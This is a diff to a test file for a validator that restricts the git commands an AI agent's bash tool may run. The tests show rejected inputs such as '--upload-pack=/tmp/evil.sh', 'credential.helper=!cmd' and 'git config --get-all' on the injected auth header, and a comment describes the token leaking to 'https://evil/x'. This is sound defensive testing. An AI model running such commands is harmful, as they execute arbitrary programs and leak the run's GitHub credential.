@@ -203,6 +203,55 @@ describe('assertBashCommandAllowed', () => {
       assertBashCommandAllowed(['git', '--config-env=x=Y', 'fetch'], bashConfig(['*'])),
     ).toThrow('git flag no permitido: --config-env')
   })
+
+  it('permite `-c` DESPUÉS del subcomando, donde no significa config', () => {
+    // `git commit -c <commit>` reusa un mensaje y `git switch -c <branch>`
+    // crea una rama. Un rechazo por posición ciega rompería los dos.
+    expect(() =>
+      assertBashCommandAllowed(['git', 'commit', '-c', 'HEAD'], bashConfig(['*'])),
+    ).not.toThrow()
+    expect(() =>
+      assertBashCommandAllowed(['git', 'switch', '-c', 'task/1'], bashConfig(['*'])),
+    ).not.toThrow()
+  })
+
+  it('rejects `git config` / `git var` — leen o persisten la credencial del run', () => {
+    // `-c` viaja por GIT_CONFIG_PARAMETERS, así que `git config --get-all`
+    // imprimiría en stdout el header que gitAuthArgs inyecta; y
+    // `git config credential.helper '!cmd'` lo persiste para el próximo run.
+    expect(() =>
+      assertBashCommandAllowed(
+        ['git', 'config', '--get-all', 'http.https://github.com/.extraHeader'],
+        bashConfig(['*']),
+      ),
+    ).toThrow('git config no permitido')
+    expect(() => assertBashCommandAllowed(['git', 'var', '-l'], bashConfig(['*']))).toThrow(
+      'git var no permitido',
+    )
+  })
+
+  it('rejects los flags que ejecutan un programa, en cualquier posición', () => {
+    // El barrido de flags globales corta en el subcomando, así que estos
+    // —que son opciones DEL subcomando— necesitan su propia pasada.
+    expect(() =>
+      assertBashCommandAllowed(
+        ['git', 'fetch', '--upload-pack=/tmp/evil.sh', 'origin'],
+        bashConfig(['*']),
+      ),
+    ).toThrow('git flag no permitido: --upload-pack')
+    expect(() =>
+      assertBashCommandAllowed(
+        ['git', 'push', '--receive-pack', '/tmp/evil.sh', 'origin'],
+        bashConfig(['*']),
+      ),
+    ).toThrow('git flag no permitido: --receive-pack')
+    expect(() =>
+      assertBashCommandAllowed(
+        ['git', 'clone', '--config', 'credential.helper=!cmd', 'https://x/y'],
+        bashConfig(['*']),
+      ),
+    ).toThrow('git flag no permitido: --config')
+  })
 })
 
 describe('normalizeTimeoutMs', () => {
@@ -488,10 +537,12 @@ describe('bash_run — credencial de git', () => {
     await tool.execute({ command: 'git push origin HEAD' }, writableCtx)
 
     const expected = `Authorization: Basic ${Buffer.from('x-access-token:ghs_installation_token').toString('base64')}`
+    // Scopeada por URL: un `http.extraHeader` pelado mandaría el token a
+    // CUALQUIER host que el agente ponga en el argv (`git fetch https://evil/x`).
     expect(spy.seen[0]).toEqual([
       'git',
       '-c',
-      `http.extraHeader=${expected}`,
+      `http.https://github.com/.extraHeader=${expected}`,
       'push',
       'origin',
       'HEAD',
